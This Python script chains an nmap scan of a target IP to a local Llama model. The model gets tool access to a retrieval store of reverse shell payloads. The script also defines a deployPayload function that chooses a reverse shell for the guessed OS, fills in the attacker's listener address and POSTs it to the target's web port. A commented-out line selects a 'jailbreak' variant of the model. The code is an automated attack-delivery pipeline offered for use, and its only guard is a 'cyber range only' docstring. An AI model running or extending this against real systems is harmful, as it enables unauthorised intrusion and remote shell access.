#!/usr/bin/env python3
"""
Modified nmap_to_llama.py with RAG integration and tool calling support.
- Validate IP input
- Run nmap (XML output)
- Parse important fields (open ports, services, versions, host info)
- Set up RAG on reverse_shells.json
- Send a concise prompt to local Ollama (Llama 3.1) with tool calling for analysis
- Supports agentic loop for tool selection (e.g., query KB)
"""

#chat transcript used: https://chatgpt.com/share/69041cad-5b04-8013-81df-2438c29ed0ca

import subprocess
import xml.etree.ElementTree as ET
import ipaddress
import requests
import textwrap
import sys
import shutil
import json
import os

# RAG dependencies (install: pip install sentence-transformers chromadb)
from sentence_transformers import SentenceTransformer
import chromadb
from chromadb.utils import embedding_functions

OLLAMA_URL = "http://localhost:11434/v1/chat/completions"  # OpenAI-style endpoint Ollama supports
MODEL = "llama3.1:latest"  # change if needed; ensure model supports tool calling
#MODEL = "llama31-8b-jailbreak"
NMAP_ARGS = ["-sV", "-O", "-Pn", "-oX", "-"]  # service/version detection, OS, no ping, output XML to stdout

# Load reverse_shells.json for RAG (assume it's in the same directory)
REVERSE_SHELLS_FILE = "reverse_shells.json"
with open(REVERSE_SHELLS_FILE, "r") as f:
    reverse_shells = json.load(f)

# Setup RAG
embedder = SentenceTransformer("all-MiniLM-L6-v2")
client = chromadb.Client()
collection_name = "reverse_shells_kb"
if collection_name in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name)
collection = client.create_collection(name=collection_name)

# Add documents to collection (chunk payloads)
documents = []
ids = []
metadatas = []
for idx, section in enumerate(reverse_shells["sections"]):
    doc = section["payload_info"]["example"]
    embedding = embedder.encode(doc).tolist()
    documents.append(doc)
    ids.append(str(idx))
    metadatas.append({"os": section["OS"]})
collection.add(
    documents=documents,
    embeddings=[embedder.encode(doc).tolist() for doc in documents],
    ids=ids,
    metadatas=metadatas
)

def query_kb(query: str, top_k: int = 3) -> str:
    """Query the knowledge base for relevant payloads."""
    results = collection.query(
        query_embeddings=embedder.encode(query).tolist(),
        n_results=top_k
    )
    relevant = []
    for i in range(top_k):
        if results["documents"] and i < len(results["documents"][0]):
            doc = results["documents"][0][i]
            meta = results["metadatas"][0][i]
            relevant.append(f"OS: {meta['os']}, Payload: {doc}")
    return "\n".join(relevant) if relevant else "No relevant payloads found."

# Define tools (you can add more here)
TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "query_kb",
            "description": "Query the reverse shells knowledge base for relevant payload examples based on OS or service.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "The search query (e.g., 'bash reverse shell')."},
                    "top_k": {"type": "integer", "description": "Number of results (default 3)."}
                },
                "required": ["query"]
            }
        }
    },
    # Add other tools here as needed (e.g., web fetch, etc.)
]

def validate_ip(ip_str: str) -> str:
    """Validate IPv4 or IPv6; raise ValueError if invalid."""
    try:
        ip = ipaddress.ip_address(ip_str.strip())
        return str(ip)
    except ValueError:
        raise ValueError(f"Invalid IP address: {ip_str}")

def check_prereqs():
    """Ensure nmap is available."""
    if not shutil.which("nmap"):
        raise EnvironmentError("nmap not found in PATH. Please install nmap and retry.")

def run_nmap(ip: str, extra_args=None, timeout=120) -> str:
    """Run nmap and return XML output as string."""
    if extra_args is None:
        extra_args = []
    cmd = ["sudo", "nmap"] + NMAP_ARGS + extra_args + [ip]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if proc.returncode != 0 and not proc.stdout:
        raise RuntimeError(f"nmap error (code {proc.returncode}):\n{proc.stderr.strip()}")
    return proc.stdout

def parse_nmap_xml(xml_text: str) -> dict:
    """
    Parse nmap XML and extract a concise summary.
    Returns dict with host_info and ports list.
    """
    root = ET.fromstring(xml_text)
    host = root.find("host")
    if host is None:
        return {"hostnames": [], "addresses": [], "ports": [], "os": None, "raw_host_state": None}

    addresses = []
    for addr in host.findall("address"):
        addr_type = addr.get("addrtype")
        addresses.append({"addr": addr.get("addr"), "type": addr_type})

    hostnames = []
    hn = host.find("hostnames")
    if hn is not None:
        for name in hn.findall("hostname"):
            hostnames.append({"name": name.get("name"), "type": name.get("type")})

    status = host.find("status")
    host_state = status.get("state") if status is not None else None

    ports = []
    ports_node = host.find("ports")
    if ports_node is not None:
        for p in ports_node.findall("port"):
            portid = p.get("portid")
            proto = p.get("protocol")
            state_node = p.find("state")
            state = state_node.get("state") if state_node is not None else None
            service_node = p.find("service")
            service = {}
            if service_node is not None:
                service = {
                    "name": service_node.get("name"),
                    "product": service_node.get("product"),
                    "version": service_node.get("version"),
                    "extrainfo": service_node.get("extrainfo"),
                    "conf": service_node.get("conf"),
                }
            ports.append({"port": int(portid), "proto": proto, "state": state, "service": service})

    os_node = host.find("os")
    os_guess = None
    if os_node is not None:
        osmatch = os_node.find("osmatch")
        if osmatch is not None:
            os_guess = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")}

    return {
        "host_state": host_state,
        "addresses": addresses,
        "hostnames": hostnames,
        "ports": ports,
        "os_guess": os_guess,
    }

def build_prompt(summary: dict, raw_xml: str = None, max_chars=3000) -> str:
    """
    Build a prompt to send to Llama for analysis.
    We include a concise summary and optionally the (truncated) raw XML for deeper parsing.
    """
    header = "You are a cybersecurity analyst. Examine the nmap scan results for potential issues and next steps.\n"
    host_info = []
    for a in summary["addresses"]:
        host_info.append(f"- {a['type']}: {a['addr']}")
    if summary["hostnames"]:
        host_info.append("- hostnames: " + ", ".join(h["name"] for h in summary["hostnames"]))
    if summary["os_guess"]:
        host_info.append(f"- OS guess: {summary['os_guess']['name']} (accuracy {summary['os_guess']['accuracy']})")
    host_info.append(f"- Host state: {summary.get('host_state')}")
    host_block = "Host info:\n" + "\n".join(host_info)

    ports_block_lines = []
    for p in sorted(summary["ports"], key=lambda x: x["port"]):
        svc = p["service"]
        svc_desc = svc.get("name") if svc else None
        prod_ver = ""
        if svc and svc.get("product"):
            prod_ver = f" ({svc.get('product')}{' ' + svc.get('version') if svc.get('version') else ''})"
        ports_block_lines.append(f" - {p['port']}/{p['proto']} {p['state']}: {svc_desc or ''}{prod_ver}")

    ports_block = "Open/filtered ports and services:\n" + ("\n".join(ports_block_lines) if ports_block_lines else " - none found")

    prompt = textwrap.dedent(
        f"""{header}
{host_block}

{ports_block}

You have access to tools, including querying a knowledge base of reverse shell payloads.
Use tools if needed to suggest conceptual next steps.

Please:
1) Give a short (3-6 bullet) prioritized list of security implications for the services found.
2) Suggest immediate next steps (tools/commands/config changes) to investigate or mitigate (be practical). Use query_kb tool for payload ideas if relevant.
3) Indicate any false positives or caveats you think might be present based only on nmap output.

Be concise and avoid full exploit instructions.

"""
    )

    if raw_xml:
        raw_to_attach = raw_xml.strip()
        if len(raw_to_attach) > max_chars:
            raw_to_attach = raw_to_attach[: max_chars] + "\n...[truncated]"
        prompt += "\n\nAdditional raw nmap output (truncated):\n" + raw_to_attach

    return prompt

def execute_tool(tool_call):
    """Execute the tool based on the call."""
    function_name = tool_call["name"]
    args = tool_call["arguments"]
    if function_name == "query_kb":
        query = args.get("query", "")
        top_k = args.get("top_k", 3)
        return query_kb(query, top_k)
    # Add executions for other tools here
    return "Tool not found."

def deployPayload(summary, reverse_shells, listener_ip, listener_port, vulnerable_endpoint='/exploit'):
    """
    Deploys a reverse shell payload based on nmap summary.
    - Selects appropriate payload based on OS guess.
    - Writes to 'current_payload.txt'.
    - POSTs to the target's most appropriate HTTP port (deemed vulnerable for demo).
    
    NOTE: This is for educational demo in isolated cyber range ONLY.
    Do not use in real environments.
    
    Args:
    - summary: Dict from parse_nmap_xml().
    - reverse_shells: Loaded JSON dict.
    - listener_ip: Attacker's IP.
    - listener_port: Attacker's listening port.
    - vulnerable_endpoint: Assumed endpoint for POST (demo placeholder).
    
    Returns: Response from POST or error message.
    """
    import requests
    
    # Get OS guess
    os_guess = summary.get('os_guess')
    if not os_guess:
        raise ValueError("No OS guess available from nmap summary.")
    
    os_name = os_guess['name'].lower()
    
    # Simple mapping to select payload section
    selected_section = None
    if 'linux' in os_name or 'unix' in os_name:
        # Prefer Bash for Linux/Unix
        selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS']), None)
    elif 'windows' in os_name:
        # Prefer PowerShell or C Windows for Windows
        selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
    else:
        raise ValueError(f"Unsupported OS guess: {os_name}")
    
    if not selected_section:
        raise ValueError("No matching reverse shell payload found for OS.")
    
    # Get payload template and replace with listener IP/port
    payload_template = selected_section['payload_info']['payload_template']
    payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
    
    # Write to file
    with open('current_payload.txt', 'w') as f:
        f.write(payload)
    
    # Deem most appropriate port: Find first open HTTP/HTTPS port
    http_ports = [p for p in summary['ports'] if p['state'] == 'open' and (p['service'].get('name') == 'http' or p['service'].get('name') == 'https')]
    if not http_ports:
        raise ValueError("No suitable HTTP/HTTPS port found in nmap summary.")
    
    deploy_port = http_ports[0]['port']  # Deem first as most appropriate
    
    # Get target IP (first IPv4 address)
    target_ip = next((a['addr'] for a in summary['addresses'] if a['type'] == 'ipv4'), None)
    if not target_ip:
        raise ValueError("No target IP found in summary.")
    
    # For demo: POST payload (assume command injection or upload vuln)
    url = f"http://{target_ip}:{deploy_port}{vulnerable_endpoint}"
    data = {'payload': payload}  # Demo data; in real vuln, this might trigger execution
    
    try:
        response = requests.post(url, data=data, timeout=10)
        return f"POST sent to {url}. Status: {response.status_code}. Response: {response.text[:200]}..."  # Truncate for safety
    except Exception as e:
        return f"Error during POST (demo): {str(e)}"

def ask_llama_with_tools(prompt: str) -> str:
    """Send prompt to Ollama with tools and handle agentic loop."""
    messages = [
        {"role": "system", "content": "You are an expert cybersecurity analyst. Use tools when appropriate."},
        {"role": "user", "content": prompt},
    ]
    analysis = ""
    max_iterations = 5  # Prevent infinite loops

    for _ in range(max_iterations):
        payload = {
            "model": MODEL,
            "messages": messages,
            "tools": TOOLS,
            "max_tokens": 800,
            "temperature": 0.2,
        }
        resp = requests.post(OLLAMA_URL, json=payload, timeout=60)
        resp.raise_for_status()
        data = resp.json()
        response = data["choices"][0]["message"]

        if "tool_calls" in response:
            tool_calls = response["tool_calls"]
            messages.append(response)  # Add assistant's message
            for tool_call in tool_calls:
                tool_result = execute_tool(tool_call["function"])
                messages.append({
                    "role": "tool",
                    "content": tool_result,
                    "name": tool_call["function"]["name"]
                })
        else:
            analysis = response["content"]
            break

    return analysis

def main():
    check_prereqs()
    if len(sys.argv) >= 2:
        ip_in = sys.argv[1]
    else:
        ip_in = input("Enter target IP (IPv4/IPv6): ").strip()

    try:
        ip = validate_ip(ip_in)
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

    print(f"Running nmap against {ip} ... (this can take a while)")
    try:
        xml = run_nmap(ip)
    except Exception as e:
        print("nmap failed:", e)
        sys.exit(1)

    summary = parse_nmap_xml(xml)
    prompt = build_prompt(summary, raw_xml=xml, max_chars=2000)

    print("Asking Llama to analyze results with tools...")
    try:
        analysis = ask_llama_with_tools(prompt)
    except Exception as e:
        print("Failed to query Llama:", e)
        sys.exit(1)

    print("\n=== Llama Analysis ===\n")
    print(analysis)
    print("\n=== End ===\n")

if __name__ == "__main__":
    main()